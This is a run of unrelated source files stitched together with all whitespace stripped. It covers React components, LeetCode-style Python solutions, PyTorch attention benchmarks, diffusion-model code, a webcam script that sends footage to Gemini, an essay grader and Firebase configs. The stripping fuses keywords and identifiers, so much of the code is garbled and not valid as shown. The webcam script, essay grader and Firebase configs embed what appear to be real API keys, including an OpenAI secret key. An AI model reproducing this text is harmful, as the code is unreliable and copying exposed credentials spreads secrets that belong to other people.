}><inputtype='radio'name={`question-${question.id}`}value={optionIndex}className={'mr-2'}disabledchecked={optionIndex===question.correctAnswerIndex}/>{option}</label>))}</div><div><buttonid={'show-explanation-button-'+cluster+'-'+i}className='mt-2mx-1px-4py-2bg-blue-500text-whiteroundedhover:bg-blue-600transition-colors'onClick={()=>{showExplanation(cluster,i);}}>ShowExplanation</button><buttonid={'bookmark-button-'+cluster+'-'+i}className={'mt-2mx-1px-l-3py-1pr-3borderroundedborder-gray-500hover:border-red-500bg-gray-100text-blackhover:bg-red-500hover:text-whitetransition-colorsease-out'}onClick={()=>{removeBookmark(cluster,question.id);}}><FontAwesomeIconclassName='ml-2mr-1'icon={faTrash}/>Remove</button></div><divid={'explanation-'+cluster+'-'+i}className='mt-2text-green-500'style={{display:'none'}}><p>{question.explanation}</p></div></div>);})}</div>))}</div>);};exportdefaultQuestionList;importunittestclassSolution:defsearch(self,nums:list[int],target:int)->int:lower=0upper=len(nums)-1while(lower<=upper):guess=(lower+upper)//2value=nums[guess]if(value==target):returnguesselif(value<target):lower=guess+1else:#value>targetupper=guess-1return-1classTestSolution(unittest.TestCase):defsetUp(self):self.s=Solution()deftest1(self):self.assertEqual(self.s.search([-1,0,3,5,9,12],9),4)deftest2(self):self.assertEqual(self.s.search([-1,0,3,5,9,12],2),-1)unittest.main()fromtypingimportDictfromeinopsimportrearrange,repeat,reducefrom.baseimportAbstractMapperfrom..datapipelineimporttime_measureclassBatchedEinopsTransform(AbstractMapper):transforms={"rearrange":rearrange,"repeat":repeat,"reduce":reduce}def__init__(self,pattern:str,key:str,mode:str="rearrange",*args,**kwargs)->None:super().__init__(*args,**kwargs)self.pattern=patternself.key=keyassertmodeinself.transforms,(f"modeparameterfor{self.__class__.__name__}hastobe"f"in{list(self.transforms)}")self.mode=mode@time_measure("BatchedEinopsTransform")def__call__(self,sample:Dict)->Dict:ifself.skip_this_sample(sample):returnsampletarget=sample[self.key]sample[self.key]=self.transforms[self.mode](target,self.pattern)deltargetreturnsampleimportFeatureCardfrom'./FeatureCard';constFeatureCardCollection=({features})=>{return(<divclassName='flexjustify-centerpy-10'><divclassName='gridgrid-cols-3gap-10w-3/5'>{features.map((feature,index)=>(<divkey={index}className='card'><FeatureCardkey={feature.title}{...feature}/></div>))}</div></div>);};exportdefaultFeatureCardCollection;slices=[1,6,12,36,60,90,119,138,154,172,227,242,263,282,307,344,398,469,508,525,552,578,622,669,711,740,795,848,862,919,973,1006,1050,1086,1177,1238,1318,1379,1420,1457,1496,1560,1630,1680,1758,1796,1864,1910,1951,1998,2056,2109,2188,2225,2266,2335]SHORTEST=100defensure_length(slices:list[int],shortest=SHORTEST):start=0while(start<len(slices)-1):end=start+1while(end<len(slices)and(slices[end]-slices[start])<shortest):end+=1delslices[start+1:end]start+=1if(len(slices)>1and(slices[-1]-slices[-2])<shortest):delslices[-1]returnslicesdefensure_end_on_period(words:list[str],slices:list[int]):#startingfromthesecondslices,ensurethateachsliceendsonaperiod#startatthatindexthensearchleftandrightforthenearestperiodforiinrange(1,len(slices)):end=slices[i]if(words[end-1][-1]!='.'):#searchleftandrightfornearestperiodleft=end-1right=endwhile(left>slices[i-1]andright<len(words)):if(words[left][-1]=='.'):slices[i]=left+1breakelif(words[right][-1]=='.'):slices[i]=right+1breakleft-=1right+=1returnslicesdefensure_start_at_beginning(slices):slices[0]=0returnslicesimportlocalFontfrom"next/font/local";import"./globals.css";constgeistSans=localFont({src:"./fonts/GeistVF.woff",variable:"--font-geist-sans",weight:"100900",});constgeistMono=localFont({src:"./fonts/GeistMonoVF.woff",variable:"--font-geist-mono",weight:"100900",});exportconstmetadata={title:"CreateNextApp",description:"Generatedbycreatenextapp",};exportdefaultfunctionRootLayout({children}){return(<htmllang="en"><bodyclassName={`${geistSans.variable}${geistMono.variable}antialiased`}>{children}</body></html>);}importunittestclassSolution:defvalid(self,nums:list[str])->bool:returnlen(set(nums))==len(nums)defisValidSudoku(self,board:list[list[str]])->bool:groups=[[(row,col)forcolinrange(9)]forrowinrange(9)]+[[(col,row)forcolinrange(9)]forrowinrange(9)]+[[(row,col)forrowinrange(i,i+3)forcolinrange(j,j+3)]foriinrange(0,9,3)forjinrange(0,9,3)]returnall([self.valid([board[row][col]forrow,colingroupifboard[row][col]!='.'])forgroupingroups])classTestSolution(unittest.TestCase):defsetUp(self):self.s=Solution()deftest_isValidSudoku(self):self.assertEqual(self.s.isValidSudoku([["5","3",".",".","7",".",".",".","."],["6",".",".","1","9","5",".",".","."],[".","9","8",".",".",".",".","6","."],["8",".",".",".","6",".",".",".","3"],["4",".",".","8",".","3",".",".","1"],["7",".",".",".","2",".",".",".","6"],[".","6",".",".",".",".","2","8","."],[".",".",".","4","1","9",".",".","5"],[".",".",".",".","8",".",".","7","9"]]),True)self.assertEqual(self.s.isValidSudoku([["8","3",".",".","7",".",".",".","."],["6",".",".","1","9","5",".",".","."],[".","9","8",".",".",".",".","6","."],["8",".",".",".","6",".",".",".","3"],["4",".",".","8",".","3",".",".","1"],["7",".",".",".","2",".",".",".","6"],[".","6",".",".",".",".","2","8","."],[".",".",".","4","1","9",".",".","5"],[".",".",".",".","8",".",".","7","9"]]),False)unittest.main()import{db}from'@/firebase/firebase';import{doc,updateDoc}from'firebase/firestore';constupdateProfile=async(uid,data)=>{try{constdocRef=doc(db,'users',uid);awaitupdateDoc(docRef,data);}catch(error){console.log('Errorupdatingdocument:',error);}};export{updateProfile};importPagefrom'@/components/Page';constMarketing=()=>{return<Pagedata_cluster='Marketing'cluster='marketing'/>;};exportdefaultMarketing;importeinopsimporttorchimporttorch.nn.functionalasFimporttorch.utils.benchmarkasbenchmarkfromtorch.backends.cudaimportSDPBackendfromsgm.modules.attentionimportBasicTransformerBlock,SpatialTransformerdefbenchmark_attn():#Letsdefineahelpfulbenchmarkingfunction:#https://pytorch.org/tutorials/intermediate/scaled_dot_product_attention_tutorial.htmldevice="cuda"iftorch.cuda.is_available()else"cpu"defbenchmark_torch_function_in_microseconds(f,*args,**kwargs):t0=benchmark.Timer(stmt="f(*args,**kwargs)",globals={"args":args,"kwargs":kwargs,"f":f})returnt0.blocked_autorange().mean*1e6#Letsdefinethehyper-parametersofourinputbatch_size=32max_sequence_len=1024num_heads=32embed_dimension=32dtype=torch.float16query=torch.rand(batch_size,num_heads,max_sequence_len,embed_dimension,device=device,dtype=dtype,)key=torch.rand(batch_size,num_heads,max_sequence_len,embed_dimension,device=device,dtype=dtype,)value=torch.rand(batch_size,num_heads,max_sequence_len,embed_dimension,device=device,dtype=dtype,)print(f"q/k/vshape:",query.shape,key.shape,value.shape)#Letsexplorethespeedofeachofthe3implementationsfromtorch.backends.cudaimportSDPBackend,sdp_kernel#Helpfulargumentsmapperbackend_map={SDPBackend.MATH:{"enable_math":True,"enable_flash":False,"enable_mem_efficient":False,},SDPBackend.FLASH_ATTENTION:{"enable_math":False,"enable_flash":True,"enable_mem_efficient":False,},SDPBackend.EFFICIENT_ATTENTION:{"enable_math":False,"enable_flash":False,"enable_mem_efficient":True,},}fromtorch.profilerimportProfilerActivity,profile,record_functionactivities=[ProfilerActivity.CPU,ProfilerActivity.CUDA]print(f"Thedefaultimplementationrunsin{benchmark_torch_function_in_microseconds(F.scaled_dot_product_attention,query,key,value):.3f}microseconds")withprofile(activities=activities,record_shapes=False,profile_memory=True)asprof:withrecord_function("Defaultdetailedstats"):for_inrange(25):o=F.scaled_dot_product_attention(query,key,value)print(prof.key_averages().table(sort_by="cuda_time_total",row_limit=10))print(f"Themathimplementationrunsin{benchmark_torch_function_in_microseconds(F.scaled_dot_product_attention,query,key,value):.3f}microseconds")withsdp_kernel(**backend_map[SDPBackend.MATH]):withprofile(activities=activities,record_shapes=False,profile_memory=True)asprof:withrecord_function("Mathimplmentationstats"):for_inrange(25):o=F.scaled_dot_product_attention(query,key,value)print(prof.key_averages().table(sort_by="cuda_time_total",row_limit=10))withsdp_kernel(**backend_map[SDPBackend.FLASH_ATTENTION]):try:print(f"Theflashattentionimplementationrunsin{benchmark_torch_function_in_microseconds(F.scaled_dot_product_attention,query,key,value):.3f}microseconds")exceptRuntimeError:print("FlashAttentionisnotsupported.Seewarningsforreasons.")withprofile(activities=activities,record_shapes=False,profile_memory=True)asprof:withrecord_function("FlashAttentionstats"):for_inrange(25):o=F.scaled_dot_product_attention(query,key,value)print(prof.key_averages().table(sort_by="cuda_time_total",row_limit=10))withsdp_kernel(**backend_map[SDPBackend.EFFICIENT_ATTENTION]):try:print(f"Thememoryefficientimplementationrunsin{benchmark_torch_function_in_microseconds(F.scaled_dot_product_attention,query,key,value):.3f}microseconds")exceptRuntimeError:print("EfficientAttentionisnotsupported.Seewarningsforreasons.")withprofile(activities=activities,record_shapes=False,profile_memory=True)asprof:withrecord_function("EfficientAttentionstats"):for_inrange(25):o=F.scaled_dot_product_attention(query,key,value)print(prof.key_averages().table(sort_by="cuda_time_total",row_limit=10))defrun_model(model,x,context):returnmodel(x,context)defbenchmark_transformer_blocks():device="cuda"iftorch.cuda.is_available()else"cpu"importtorch.utils.benchmarkasbenchmarkdefbenchmark_torch_function_in_microseconds(f,*args,**kwargs):t0=benchmark.Timer(stmt="f(*args,**kwargs)",globals={"args":args,"kwargs":kwargs,"f":f})returnt0.blocked_autorange().mean*1e6checkpoint=Truecompile=Falsebatch_size=32h,w=64,64context_len=77embed_dimension=1024context_dim=1024d_head=64transformer_depth=4n_heads=embed_dimension//d_headdtype=torch.float16model_native=SpatialTransformer(embed_dimension,n_heads,d_head,context_dim=context_dim,use_linear=True,use_checkpoint=checkpoint,attn_type="softmax",depth=transformer_depth,sdp_backend=SDPBackend.FLASH_ATTENTION,).to(device)model_efficient_attn=SpatialTransformer(embed_dimension,n_heads,d_head,context_dim=context_dim,use_linear=True,depth=transformer_depth,use_checkpoint=checkpoint,attn_type="softmax-xformers",).to(device)ifnotcheckpointandcompile:print("compilingmodels")model_native=torch.compile(model_native)model_efficient_attn=torch.compile(model_efficient_attn)x=torch.rand(batch_size,embed_dimension,h,w,device=device,dtype=dtype)c=torch.rand(batch_size,context_len,context_dim,device=device,dtype=dtype)fromtorch.profilerimportProfilerActivity,profile,record_functionactivities=[ProfilerActivity.CPU,ProfilerActivity.CUDA]withtorch.autocast("cuda"):print(f"Thenativemodelrunsin{benchmark_torch_function_in_microseconds(model_native.forward,x,c):.3f}microseconds")print(f"Theefficientattnmodelrunsin{benchmark_torch_function_in_microseconds(model_efficient_attn.forward,x,c):.3f}microseconds")print(75*"+")print("NATIVE")print(75*"+")torch.cuda.reset_peak_memory_stats()withprofile(activities=activities,record_shapes=False,profile_memory=True)asprof:withrecord_function("NativeAttentionstats"):for_inrange(25):model_native(x,c)print(prof.key_averages().table(sort_by="cuda_time_total",row_limit=10))print(torch.cuda.max_memory_allocated()*1e-9,"GBusedbynativeblock")print(75*"+")print("Xformers")print(75*"+")torch.cuda.reset_peak_memory_stats()withprofile(activities=activities,record_shapes=False,profile_memory=True)asprof:withrecord_function("xformersstats"):for_inrange(25):model_efficient_attn(x,c)print(prof.key_averages().table(sort_by="cuda_time_total",row_limit=10))print(torch.cuda.max_memory_allocated()*1e-9,"GBusedbyxformersblock")deftest01():#conv1x1vslinearfromsgm.utilimportcount_paramsconv=torch.nn.Conv2d(3,32,kernel_size=1).cuda()print(count_params(conv))linear=torch.nn.Linear(3,32).cuda()print(count_params(linear))print(conv.weight.shape)#usesameinitializationlinear.weight=torch.nn.Parameter(conv.weight.squeeze(-1).squeeze(-1))linear.bias=torch.nn.Parameter(conv.bias)print(linear.weight.shape)x=torch.randn(11,3,64,64).cuda()xr=einops.rearrange(x,"bchw->b(hw)c").contiguous()print(xr.shape)out_linear=linear(xr)print(out_linear.mean(),out_linear.shape)out_conv=conv(x)print(out_conv.mean(),out_conv.shape)print("donewithtest01.\n")deftest02():#trycosineflashattentionimporttimetorch.backends.cuda.matmul.allow_tf32=Truetorch.backends.cudnn.allow_tf32=Truetorch.backends.cudnn.benchmark=Trueprint("testingcosineflashattention...")DIM=1024SEQLEN=4096BS=16print("softmax(vanilla)first...")model=BasicTransformerBlock(dim=DIM,n_heads=16,d_head=64,dropout=0.0,context_dim=None,attn_mode="softmax",).cuda()try:x=torch.randn(BS,SEQLEN,DIM).cuda()tic=time.time()y=model(x)toc=time.time()print(y.shape,toc-tic)exceptRuntimeErrorase:#likelyoomprint(str(e))print("\nnowflash-cosine...")model=BasicTransformerBlock(dim=DIM,n_heads=16,d_head=64,dropout=0.0,context_dim=None,attn_mode="flash-cosine",).cuda()x=torch.randn(BS,SEQLEN,DIM).cuda()tic=time.time()y=model(x)toc=time.time()print(y.shape,toc-tic)print("donewithtest02.\n")if__name__=="__main__":#test01()#test02()#test03()#benchmark_attn()benchmark_transformer_blocks()print("done.")importcv2fromultralyticsimportYOLOfromcollectionsimportdequefromthreadingimportThreadimportgoogle.generativeaiasgenaiimportosFPS=30#framespersecondCONFIDENCE_THRESHOLD=0.6#facedetectionconfidencethresholdLOWER_VIDEO_FRAMES_THRESHOLD=2*FPS#shortestvideodurationinsecondsUPPER_VIDEO_FRAMES_THRESHOLD=30*FPS#longestvideodurationinsecondsPASSIVE_FRAMES=10*FPS#framestoexportbeforepersonisdetectedPROCESSING_FRAMES=30#process1frameeverynframesNOT_DETECTED_THRESHOLD=2*FPS#numberofframestowaitbeforestoppingrecordingPROMPT='Youareanalyzingthesecuritycamerafootagetoinformahomeownerforanypotentialcriminalactivityaimedattheirproperty.Assumeallindividualsthatappearinthevideofootagearenotthehomeowner.ThisisaTextmessagekeepitconciseandhighlyinformativeandincludenomarkuporspecialcharecters.Keepthemessageshortat~250characters.'genai.configure(api_key='AIzaSyCUAR7qw9UPOay8T8Pg9-ExH0OJSCNU89E')genai_model=genai.GenerativeModel(model_name='models/gemini-1.5-pro-latest')defdetect_person(image,model)->tuple[bool,float]:results=model.predict(source=image,verbose=False,conf=CONFIDENCE_THRESHOLD)forrinresults:boxes=r.boxesforboxinboxes:iclass=int(box.cls[0])if(iclass==0):confidence=float(box.conf)return(True,confidence)return(False,0)#Startwebcamcap=cv2.VideoCapture(0)cap.set(3,640)cap.set(4,480)yolo_model=YOLO('yolov9e.pt')yolo_model.to('cuda')defframes_to_mp4(frames,filename):fourcc=cv2.VideoWriter_fourcc(*'mp4v')out=cv2.VideoWriter(filename,fourcc,30.0,(640,480))forframeinframes:out.write(frame)out.release()defupload_to_gemini(genai,frames,prompt=PROMPT)->str:request=[prompt]fori,frameinenumerate(frames[1::PROCESSING_FRAMES]):path=f'frame_{i}.jpg'cv2.imwrite(path,frame)response=genai.upload_file(path)request.append(str(i))request.append(response)response=genai_model.generate_content(request,request_options={'timeout':600},safety_settings={'HATE':'BLOCK_NONE','HARASSMENT':'BLOCK_NONE','SEXUAL':'BLOCK_NONE','DANGEROUS':'BLOCK_NONE'})foriinrange(len(frames[1::PROCESSING_FRAMES])):path=f'frame_{i}.jpg'os.remove(path)print(response.text)returnresponse.textpframes=deque(maxlen=PASSIVE_FRAMES)#10secondsofframesat30fpsiframe=0#numberofframesrecordedframes=[]#startrecordingwhenpersonisdetectedandrecorduntilpersonisnotdetectedpdetected=deque(maxlen=NOT_DETECTED_THRESHOLD)ivideo=0threads=[]while(True):success,img=cap.read()bdetected,confidence=detect_person(img,yolo_model)if(bdetected):print('Persondetected!',confidence)frames.append(img)iframe+=1if(iframe>UPPER_VIDEO_FRAMES_THRESHOLD):#frames_to_mp4(list(pframes)+frames,f'output_{ivideo}.mp4')thread=Thread(target=upload_to_gemini,args=(genai,list(pframes)+frames))thread.start()threads.append(thread)ivideo+=1frames=[]pframes.clear()iframe=0pdetected.append(True)else:print('Nopersondetected.',confidence)pframes.append(img)pdetected.append(False)if(len(frames)>LOWER_VIDEO_FRAMES_THRESHOLDandall(notpdforpdinpdetected)):#frames_to_mp4(list(pframes)+frames,f'output_{ivideo}.mp4')thread=Thread(target=upload_to_gemini,args=(genai,list(pframes)+frames))thread.start()threads.append(thread)ivideo+=1frames=[]pframes.clear()cv2.imshow('Webcam',img)ifcv2.waitKey(1)==ord('q'):breakforthreadinthreads:thread.join()cap.release()cv2.destroyAllWindows()constHorizontalLineNarrow=()=>{return<hrclassName='min-w-fullh-[2px]mx-automy-4bg-gray-200border-0roundedmd:my-10'/>;};exportdefaultHorizontalLineNarrow;importrequestsimportjsonimportstreamlitasstimportnltkimportgingeritimportmathfromgingerit.gingeritimportGingerItkey='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'url='https://api.openai.com/v1/engines/davinci-codex/completions'text="Dearlocalnewspaper,Ithinkeffectscomputershaveonpeoplearegreatlearningskills/affectsbecausetheygiveustimetochatwithfriends/newpeople,helpsuslearnabouttheglobe(astronomy)andkeepsusoutoftroble!Thingabout!Dontyouthinkso?Howwouldyoufeelifyourteenagerisalwaysonthephonewithfriends!Doyouevertimetochatwithyourfriendsorbuisnesspartneraboutthings."text3="You@MONTH1findthishardtobeleive,butmanypeoplethinkcomptersputanegativeattitudeonpeople.Nowyou@MONTH1besayingthatsnottrue,thateveryonehasacomputer,butthetruthistheydon'tandtheybelieveitputsnegativeattitudeonpeople.Peoplehavemanyreasonsforowningacomputerandoneisfriends.Didyou@CAPS5somepeopleowncomputersbecausetheywanttostayintouchwithfriendsfromdifferntstateswholivefaraway.Forexample,manypeopleuse@CAPS1or@CAPS2toconnectwithfriends.IcanmakeaconnectionbecauseIhavebotha@CAPS1and@CAPS2thatIusetostayincontactwithfamilyfriendsfromallover.Somepeople,likemyself,evenhavefriendsfromdifferentcountries!I@CAPS5thatmanypeoplewanttolearnaboutpeoplefromdifferntcountriesandthisisonewaytodoitrightnowIamlearningsomenewthingsaboutthe@LOCATION1becauseIamfriendswithsomeonewholivesin@LOCATION2.Whileonthiswonderfuladventureoflearningyou@MONTH1evengetyourselfintoavacationadventure.Arecenttestwastakingstatingthat@NUM1outof@NUM2peopleliketotravelbutdon't@CAPS5where.Somepeoplesaythatpeoplespendtomuchtimeonthecomputerbutnotenoughenjoyingnature.Thesepeoplearewrongifoneisonacomputerandtheyarechatingwithsomeonefromadifferntstateorcountrythenthatpersonmightpersuadethemtotakeavisitthere.Forexampletheywouldbeabletogototheinternettypeintheplacetheywanttovisitandgetphotographsandinformationabouttheplace.Asaresult,peoplewouldstillgettoenjoynature.Sometimesusingthecomputercouldbeeducational.Manypeople@MONTH1disagreewiththatstatementbutitstrue.Forexamplewhenonthecomputermanypeopleintheirsenioryearofhighschooluseittotakeonlinecollegecoursestogettheirdegreebecausegoingtoaregularcollege@MONTH1affecttheirworkscheduale.Thiscouldalsohelpstudentsinanygradelearnmoreaboutthetopictheyarestuding.Itwouldalsohelpthemontheirreports.Forexampletheywouldbeabletogetpicturesandotherinformationanytimetheywantedto.Asaresult,thestudentsgradeswouldincrease.Ihopemanyofyouagreewithmystatementandhelpspreadthewordthatcomputerscouldbepositiveonthemind.Asaresultforthosewhodidn'tagreewiththestatementthattheyarepositivenotnegativeIhopethatyouwillredecideonyouropion."parser=GingerIt()classGingerFormatter:def__init__(self,text):self.text=textdefsupplementaryParser(self):maxWordCount=300Corrections=[]iflen(self.text)>maxWordCount:split_sent=nltk.tokenize.sent_tokenize(self.text)foriinrange(len(split_sent)):phrase=split_sent[i]parsed_l=parser.parse(phrase)Corrections.extend(parsed_l['corrections'])returnCorrectionselse:x=parser.parse(self.text)returnxdefformatter(self,correct):self.correct=correctnumErrors=len(self.correct)results=f"Thereare{numErrors}errorsinyouressay\nThecorrectionshavebeenlistedbelow\n"foriinrange(len(self.correct)):resultSpecific=self.correct[i]results+=f"{i+1}.\n"results+=f"themistakewas:{resultSpecific['text']}\n"results+=f"thecorrectionwaytohavewrittenthisis:{resultSpecific['correct']}\n"results+="\n"ifresultSpecific['definition']!=None:ifresultSpecific['definition']=='Acceptspace':results+=f"Reason:Addaspace\n"results+="\n"elifresultSpecific['definition']=='Acceptcommaaddition':results+=f"Reason:Acommaismissing(punctuationerror)\n"results+="\n"else:results+=f"Definition/Reason:{resultSpecific['definition']}\n"results+="\n"returnresultsst.title('AutomatedEssayGrader')headers={"Content-Type":"application/json","Authorization":f"Bearer{key}"}essay=st.text_input('Prompt')gpt_prompt='Listideasyouwouldincludeinanessaythatwouldrespondtothisprompt:"'+essay+'"'assertlen(gpt_prompt)<64*4,'GPTpromptmustbelessthan64tokens'parameters={'prompt':gpt_prompt,'max_tokens':256,'temperature':0.9,'top_p':1,'n':1,}ifst.button('Submit'):#response=requests.post(url,headers=headers,data=json.dumps(parameters))#st.write(response.json()['choices'][0]['text'])st.write(essay)output=(additionalParse:=GingerFormatter(essay)).formatter(additionalParse.supplementaryParser())st.write(output)classEdit:def__init__(self,start:int,end:int,replacement:str):self.start=startself.end=endself.replacement=replacementclassEditable:def__init__(self,base:str,edits:list[Edit]=[]):self.base=baseself.edits=edits@propertydefresult(self):result=self.baseforeditinself.edits:result=result[:edit.start]+edit.replacement+result[edit.end:]returnresultif__name__=='__main__':editable=Editable('helloworld',[Edit(0,5,'goodbye'),Edit(6,11,'universe')])print(editable.result)import{initializeApp}from'firebase/app';import{getFirestore}from'firebase/firestore';constfirebaseConfig={apiKey:'AIzaSyBZDVfvrrlwjpFs_7E6MAEc9aevZBHpyeU',authDomain:'endurascribe.firebaseapp.com',projectId:'endurascribe',storageBucket:'endurascribe.appspot.com',messagingSenderId:'859204100021',appId:'1:859204100021:web:0803e17128c11a65dbc3fc',};constapp=initializeApp(firebaseConfig);constdb=getFirestore(app);exportdefaultdb;importrequestsfrombs4importBeautifulSoupfromconcurrent.futuresimportThreadPoolExecutorbase='https://www.ncei.noaa.gov/data/oceans/crw/tsps50km/sst_anomaly/'defget_links(year:int)->list[str]:soup=BeautifulSoup(requests.get(base+str(year)+'/').content)return[link.textforlinkinsoup.find_all('a')iflink.text.endswith('.bmp')]defget_date_from_link(link:str)->str:return'.'.join(link.split('.')[-2:])defdownload_file(url:str):withopen('src/Data/Raw/SeaSurfaceTemperature/'+url,'wb')asf:f.write(requests.get(url).content)defdownload():withThreadPoolExecutor()asexecutor:foryearinrange(2000,2020+1):links=get_links(year)forlinkinlinks:url=base+str(year)+'/'+link#executor.submit(download_file,url)image=requests.get(url).contentwithopen('src/Data/Raw/SeaSurfaceTemperature/'+get_date_from_link(link),'wb')asf:f.write(image)print(f'Downloaded{link}')print(f'Downloaded{year}')#defcoordinate_to_horizontally_nearest_nonblack_color()#readimagefromfilefile='C:/Users/natha/Programming/Drought-Prediction/src/Data/Raw/SeaSurfaceTemperature/20001231.bmp'typergb=tuple[int,int,int]defadjust_color(color:rgb)->rgb:#manipulatethecolorandreturna=[[5,3.3,2],[6,3.7,0],[7,3.9,-2],[8,4,0],[9,3.9,2],[10,3.7,0],[11,3.3,-2],[12,2.8,0],[13,2.2,2],[14,1.5,0],[15,0.8,-2],[16,0,0],[17,-0.8,2],[18,-1.5,0],[19,-2.2,-2],[20,-2.8,0],[21,-3.3,2],[22,-3.7,0],[23,-3.9,-2],[24,-4,0],[25,-3.9,2],[26,-3.7,0],[27,-3.3,-2],[28,-2.8,0],[29,-2.2,2],[30,-1.5,0],[31,-0.8,-2],[32,0,0],]importmatplotlib.pyplotaspltforrowina:row.append(row[1]+row[2])x=[i[0]foriina]y1=[i[1]foriina]y2=[i[2]foriina]y3=[i[3]foriina]#plottwolinesplt.plot(x,y1,label='y1')plt.plot(x,y2,label='y2')plt.plot(x,y3,label='y3')#setx-axislabelplt.xlabel('x')#sety-axislabelplt.ylabel('y')#settitleplt.title('TwoLines')#showlegendonplotplt.legend()plt.show()import{initializeApp}from'firebase/app';import{getAuth,signInWithPopup,GoogleAuthProvider,onAuthStateChanged}from'firebase/auth';import{getFirestore,doc,setDoc,getDoc,updateDoc}from'firebase/firestore';constfirebaseConfig={apiKey:'AIzaSyDHIqmIfl4nvt0mtZGN_QAAy7WWwY4KMVk',authDomain:'welearn-e0136.firebaseapp.com',projectId:'welearn-e0136',storageBucket:'welearn-e0136.appspot.com',messagingSenderId:'852501815226',appId:'1:852501815226:web:2c94c732ec0457a3c2c783',};constapp=initializeApp(firebaseConfig);constauth=getAuth(app);constdb=getFirestore(app);constprovider=newGoogleAuthProvider();constsignInWithGoogle=async()=>{constresult=awaitsignInWithPopup(auth,provider);constuser=result.user;constdb=getFirestore(app);constdocRef=doc(db,'users',user.uid);constdocSnap=awaitgetDoc(docRef);if(!docSnap.exists()){awaitsetDoc(docRef,{email:user.email,profilePicture:user.photoURL,displayName:user.displayName,uid:user.uid,graduationYear:'',major:'',classes:[],});window.location.href='/profile/edit?firstLogin=true';}};export{signInWithGoogle,auth,db};importloggingimportmathfromabcimportabstractmethodfromtypingimportIterable,List,Optional,Tuple,Unionimporttorchasthimporttorch.nnasnnimporttorch.nn.functionalasFfromeinopsimportrearrangefromtorch.utils.checkpointimportcheckpointfrom...modules.attentionimportSpatialTransformerfrom...modules.diffusionmodules.utilimport(avg_pool_nd,conv_nd,linear,normalization,timestep_embedding,zero_module)from...modules.video_attentionimportSpatialVideoTransformerfrom...utilimportexistslogpy=logging.getLogger(__name__)classAttentionPool2d(nn.Module):"""AdaptedfromCLIP:https://github.com/openai/CLIP/blob/main/clip/model.py"""def__init__(self,spacial_dim:int,embed_dim:int,num_heads_channels:int,output_dim:Optional[int]=None,):super().__init__()self.positional_embedding=nn.Parameter(th.randn(embed_dim,spacial_dim**2+1)/embed_dim**0.5)self.qkv_proj=conv_nd(1,embed_dim,3*embed_dim,1)self.c_proj=conv_nd(1,embed_dim,output_dimorembed_dim,1)self.num_heads=embed_dim//num_heads_channelsself.attention=QKVAttention(self.num_heads)defforward(self,x:th.Tensor)->th.Tensor:b,c,_=x.shapex=x.reshape(b,c,-1)x=th.cat([x.mean(dim=-1,keepdim=True),x],dim=-1)x=x+self.positional_embedding[None,:,:].to(x.dtype)x=self.qkv_proj(x)x=self.attention(x)x=self.c_proj(x)returnx[:,:,0]classTimestepBlock(nn.Module):"""Anymodulewhereforward()takestimestepembeddingsasasecondargument."""@abstractmethoddefforward(self,x:th.Tensor,emb:th.Tensor):"""Applythemoduleto`x`given`emb`timestepembeddings."""classTimestepEmbedSequential(nn.Sequential,TimestepBlock):"""Asequentialmodulethatpassestimestepembeddingstothechildrenthatsupportitasanextrainput."""defforward(self,x:th.Tensor,emb:th.Tensor,context:Optional[th.Tensor]=None,image_only_indicator:Optional[th.Tensor]=None,cond_view:Optional[th.Tensor]=None,cond_motion:Optional[th.Tensor]=None,time_context:Optional[int]=None,num_video_frames:Optional[int]=None,time_step:Optional[int]=None,name:Optional[str]=None,):from...modules.diffusionmodules.video_modelimportVideoResBlock,PostHocResBlockWithTimefrom...modules.spacetime_attentionimport(BasicTransformerTimeMixBlock,PostHocSpatialTransformerWithTimeMixing,PostHocSpatialTransformerWithTimeMixingAndMotion)forlayerinself:module=layerifisinstance(module,(BasicTransformerTimeMixBlock,PostHocSpatialTransformerWithTimeMixing,PostHocSpatialTransformerWithTimeMixingAndMotion),):x=layer(x,context,#cam,time_context,num_video_frames,image_only_indicator,cond_view,cond_motion,time_step,name,)elifisinstance(module,SpatialVideoTransformer):x=layer(x,context,time_context,num_video_frames,image_only_indicator,#time_step,)elifisinstance(module,PostHocResBlockWithTime):x=layer(x,emb,num_video_frames,image_only_indicator)elifisinstance(module,VideoResBlock):x=layer(x,emb,num_video_frames,image_only_indicator)elifisinstance(module,TimestepBlock)andnotisinstance(module,VideoResBlock):x=layer(x,emb)elifisinstance(module,SpatialTransformer):x=layer(x,context)else:x=layer(x)returnxclassUpsample(nn.Module):"""Anupsamplinglayerwithanoptionalconvolution.:paramchannels:channelsintheinputsandoutputs.:paramuse_conv:abooldeterminingifaconvolutionisapplied.:paramdims:determinesifthesignalis1D,2D,or3D.If3D,thenupsamplingoccursintheinner-twodimensions."""def__init__(self,channels:int,use_conv:bool,dims:int=2,out_channels:Optional[int]=None,padding:int=1,third_up:bool=False,kernel_size:int=3,scale_factor:int=2,):super().__init__()self.channels=channelsself.out_channels=out_channelsorchannelsself.use_conv=use_convself.dims=dimsself.third_up=third_upself.scale_factor=scale_factorifuse_conv:self.conv=conv_nd(dims,self.channels,self.out_channels,kernel_size,padding=padding)defforward(self,x:th.Tensor)->th.Tensor:assertx.shape[1]==self.channelsifself.dims==3:t_factor=1ifnotself.third_upelseself.scale_factorx=F.interpolate(x,(t_factor*x.shape[2],x.shape[3]*self.scale_factor,x.shape[4]*self.scale_factor,),mode="nearest",)else:x=F.interpolate(x,scale_factor=self.scale_factor,mode="nearest")ifself.use_conv:x=self.conv(x)returnxclassDownsample(nn.Module):"""Adownsamplinglayerwithanoptionalconvolution.:paramchannels:channelsintheinputsandoutputs.:paramuse_conv:abooldeterminingifaconvolutionisapplied.:paramdims:determinesifthesignalis1D,2D,or3D.If3D,thendownsamplingoccursintheinner-twodimensions."""def__init__(self,channels:int,use_conv:bool,dims:int=2,out_channels:Optional[int]=None,padding:int=1,third_down:bool=False,):super().__init__()self.channels=channelsself.out_channels=out_channelsorchannelsself.use_conv=use_convself.dims=dimsstride=2ifdims!=3else((1,2,2)ifnotthird_downelse(2,2,2))ifuse_conv:logpy.info(f"BuildingaDownsamplelayerwith{dims}dims.")logpy.info(f"-->settingsare:\nin-chn:{self.channels},out-chn:{self.out_channels},"f"kernel-size:3,stride:{stride},padding:{padding}")ifdims==3:logpy.info(f"-->Downsamplingthirdaxis(time):{third_down}")self.op=conv_nd(dims,self.channels,self.out_channels,3,stride=stride,padding=padding,)else:assertself.channels==self.out_channelsself.op=avg_pool_nd(dims,kernel_size=stride,stride=stride)defforward(self,x:th.Tensor)->th.Tensor:assertx.shape[1]==self.channelsreturnself.op(x)classResBlock(TimestepBlock):"""Aresidualblockthatcanoptionallychangethenumberofchannels.:paramchannels:thenumberofinputchannels.:paramemb